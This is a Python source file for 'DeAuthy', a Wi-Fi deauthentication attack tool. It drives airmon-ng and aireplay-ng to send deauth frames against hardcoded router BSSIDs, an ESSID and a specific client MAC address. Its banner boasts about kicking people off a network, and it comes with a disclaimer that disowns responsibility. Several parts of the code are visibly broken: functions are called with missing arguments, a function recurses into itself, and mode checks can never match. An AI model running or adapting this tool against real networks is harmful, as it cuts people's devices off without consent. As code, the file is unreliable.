from os import geteuid, execv
from socket import if_nameindex
from tabnanny import check
from colorama import init, Fore, Back, Style
from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
from termcolor import colored
from sys import exit, executable, argv
from halo import Halo
from time import sleep

# Beautiful is better than ugly.
# Explicit is better than implicit.
# Simple is better than complex.
# Complex is better than complicated.
# Flat is better than nested.
# Sparse is better than dense.
# Readability counts.
# Special cases aren't special enough to break the rules.
# Although practicality beats purity.
# Errors should never pass silently.
# Unless explicitly silenced.
# In the face of ambiguity, refuse the temptation to guess.
# There should be one-- and preferably only one --obvious way to do it.
# Although that way may not be obvious at first unless you're Dutch.
# Now is better than never.
# Although never is often better than *right* now.
# If the implementation is hard to explain, it's a bad idea.
# If the implementation is easy to explain, it may be a good idea.
# Namespaces are one honking great idea -- let's do more of those!

white       = Fore.WHITE
light_white = Fore.LIGHTBLACK_EX
red         = Fore.RED
yellow      = Fore.LIGHTYELLOW_EX
light_green = Fore.LIGHTGREEN_EX
magenta     = Fore.MAGENTA
cyan        = Fore.CYAN
blue        = Fore.BLUE
light_blue  = Fore.LIGHTBLUE_EX
bold        = '\033[1m'
underline   = '\033[4m'
end         = '\033[0m'

# config here
class Config:
    prefix = f"!"
    iface_no_mon = "wlo1"
    iface_mon = "wlo1mon"
    ESSID = {"Internet":11} # <ESSID>:<It's channel>
    BSSIDs = {
        "28:C7:CE:4E:AF:B0":1,  # <BSSID>:<It's channel>
        "28:c7:ce:4e:af:bf":1,  # <BSSID>:<It's channel>
        "50:1C:BF:E2:DE:F0":11, # <BSSID>:<It's channel>
        "28:C7:CE:4F:06:C0":1,  # <BSSID>:<It's channel>
        "28:C7:CE:4F:04:F0":6,  # <BSSID>:<It's channel>
        } 
    STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to deauthenticate

def has_root():
    return geteuid() == 0

def clear():
    check_call(["clear"])

class CommandHandler:
    supported_commands_debian_based_distros = [
        "ifconfig",
        "ls",
    ]
    own_commands = [
        f"{Config.prefix}help",
        f"{Config.prefix}about",
        f"{Config.prefix}repo",
    ]

    class Own_Cmds:
        def d_help():
            print(
                f"""
{white}{bold}[{end}DeAuthy commands{white}{bold}]{end} {white}Page {light_green}{bold}1{end}{white}/1
{light_white}- {light_green}help {light_white}-- {white}Views this message.
{light_white}- {light_green}repo {light_white}-- {white}Displays the link to deauthy's Github repository.
{light_white}- {light_green}about {light_white}-- {white}Displays information about the project.
                """)

        def d_about():
            print(
                f"""{white}{bold}
DeAuthy{end} {white}version: {light_white}Private Repository Version
{white}
Note: {light_white}Version numbers are gonna be set once this project is released.
{white}{bold}
Author:{end} {light_green}Dr-Insanity {white}(On Github)

{bold}{red}Disclaimer{end}{white}:{red}
I do not condone illegal activities.
I discourage non-ethical use of my application.
I only developed this program.
Anything that you do with this application is not done by 
me and therefore you're the only one responsible for any 
damage you cause.
By using this application, you fully understood and agreed 
with what I just said and you understand you're on your
own when you're charged or in a lawsuit, unless you got others rooting for you. 
It won't be me.{end}
                """)

        def d_repo():
            print(
                f"""{white}{bold}
DeAuthy{end} {white}repository: {light_green}https://github.com/Dr-Insanity/deauthy
{end}
                """)

        handle_own_cmd = {
            f"{Config.prefix}help":d_help,
            f"{Config.prefix}about":d_about,
            f"{Config.prefix}repo":d_repo,
        }

class deauthy:
    """Main class"""

    def DeAuThY():
        """Prefix for most output coming from DeAuthy"""
        return white + "[" + red + "D" + yellow + "E" + light_green + "A" + magenta + "U" + cyan + "T" + blue + "H" + red + "Y" + white + "]"

    def inform(msg: str, entire_color=light_white):
        d_hey = white + f"{bold}[" + light_green + "+" + white + f"]{end}{light_white} "
        print(deauthy.DeAuThY() + d_hey + entire_color + msg)

    def prompt(question: str, allowed_replies: list[str], ending_color=white):
        d_huh = white + f"{bold}[" + light_blue + "?" + white + f"]{end}{light_white} "
        reply = input(deauthy.DeAuThY() + d_huh + f"{light_white}{question}{bold}>{end} {ending_color}")
        if reply.lower() in CommandHandler.supported_commands_debian_based_distros:
            print(end)
            check_call(reply)
            reply = deauthy.prompt(question, allowed_replies, ending_color)
            return reply
        elif reply in CommandHandler.own_commands:
            CommandHandler.Own_Cmds.handle_own_cmd[reply]()
            reply = deauthy.prompt(question, allowed_replies, ending_color)
            return reply
        elif reply.lower() in allowed_replies:
            return reply
        else:
            deauthy.tell_issue(f"{red}That's not a valid {bold}{red}reply{end}{red} :/")
            deauthy.inform(f"{light_green}{bold}Restarting " + red + "D" + yellow + "E" + light_green + "A" + magenta + "U" + cyan + "T" + blue + "H" + red + "Y")
            sleep(2) # enough time to read above line
            execv(executable, ['python3'] + argv)

    def tell_issue(msg: str):
        d_wut = white + f"{bold}[" + red + "!" + white + f"]{end}{light_white} "
        print(deauthy.DeAuThY() + d_wut + msg)

    def Chipset_Support_Check():
        deauthy.inform("Checking if any of your devices (Built-in & External) support MONITOR mode...")
        for chipset_name in ["AR92", "RT3070", "RT3572", "8187L", "RTL8812AU", "AR93"]:
            try:
                out = check_output(f"lspci | grep {chipset_name}", shell=True)
                if chipset_name in out.decode():
                    put = out.decode('utf8', 'strict')
                    return True
            except CalledProcessError:
                deauthy.tell_issue(f"{red}{bold}I'm so sorry!")
                deauthy.tell_issue(f"{red}{bold}It seems your chipset is NOT SUPPORTED :/")
                deauthy.tell_issue(f"{red}{bold}If you are very certain your chipset supports monitor mode and packet injection")
                deauthy.tell_issue(f"{red}{bold}Please contribute to the project here by making an issue")
                deauthy.tell_issue(f"{red}{bold}Go to: {white}https://github.com/Dr-Insanity/deauthy/issues/new")
                deauthy.inform(f"{red}{bold}Goodbye!\n{end}Exiting...")
                exit(1)

    def prompt_for_ifaces():
        cards = []
        def gather_ifaces():
            pos = 1
            for ifaces in if_nameindex():
                print(f"{white}[{yellow}{pos}{white}] {white}{ifaces[1]}")
                cards.append(str(pos))
                pos += 1
            return pos-1
        ifaces = gather_ifaces()
        try:
            method = deauthy.prompt(f"{light_white}Which {bold}wireless{end}{light_white} interface should be put into monitor mode? Enter corresponding number {light_blue}({yellow}1{white}-{yellow}{ifaces}{light_blue})", cards, yellow)
        except KeyboardInterrupt:
            print(" ")
            deauthy.inform(f"{light_green}{bold}Goodbye!\n{end}Exiting...")
            exit(0)
    class Appearance:

        def printBanner():
            clear()
            print(red + """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗██╗   ██╗
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║╚██╗ ██╔╝
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║ ╚████╔╝ 
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║  ╚██╔╝  
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝                             
            """ + light_green + """
Time to kick off some assholes from yer net""")
            return True

    class BSSID:
        def deauth(bSSID: str):
            """"""
            channel = Config.BSSIDs[bSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch("managed")
                return
    class ESSID:
        def deauth(eSSID: str):
            """"""
            channel = Config.ESSID[eSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch("managed")
                return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            out = check_call(["airmon-ng", "start", f"{Config.iface_no_mon}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

    class InterfaceMode:
        def switch(card: str, mode: str):
            """
            Accepts either "monitor" or "managed"
            """
            def managed():
                out = check_call(["airmon-ng", "stop", f"{card}mon"], stdout=DEVNULL, stderr=STDOUT)
            def monitor():
                out = check_call(["airmon-ng", "start", f"{card}"], stdout=DEVNULL, stderr=STDOUT)
            modes = {
                "managed":managed,
                "monitor":monitor,
            }
            try:
                modes[mode]()
            except KeyError:
                raise RuntimeError("That's not a valid interface mode.")

def main():
    def do_bssid_method():
        for bssid, channel in Config.BSSIDs.items():
            deauthy.BSSID.deauth(bssid)
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch("managed")
            return
    
    deauthy.inform(f"{bold}{light_green}Hey! {end}{light_white}Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")
    deauthy.Chipset_Support_Check()
    deauthy.inform(f"{white}Running as {light_green}{bold}Root{end}")
    deauthy.inform(f"{bold}{white}Chipset is {light_green}supported!{end}")
    deauthy.inform(f"{red}Choose a {bold}{red}wireless{end}{red} interface {white}({light_white}{bold}step {light_green}1{end}{light_white}/{white}3)")
    deauthy.prompt_for_ifaces()
    deauthy.InterfaceMode.switch(card="", mode="monitor")
    method = deauthy.prompt(question="Use given ESSID or the list of BSSIDs (BSSID / ESSID)", allowed_replies=["bssid", "essid"])
    if method == "BSSID":
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch("managed")
            return
    if method == "ESSID":
        deauthy.ESSID.deauth(Config.ESSID)
        return

try:
    if not has_root():
        deauthy.tell_issue(f"{bold}{red}Run it as root...{end}")
        exit(1)
    deauthy.Appearance.printBanner()
    main()
except KeyboardInterrupt:
    deauthy.InterfaceMode.switch("managed")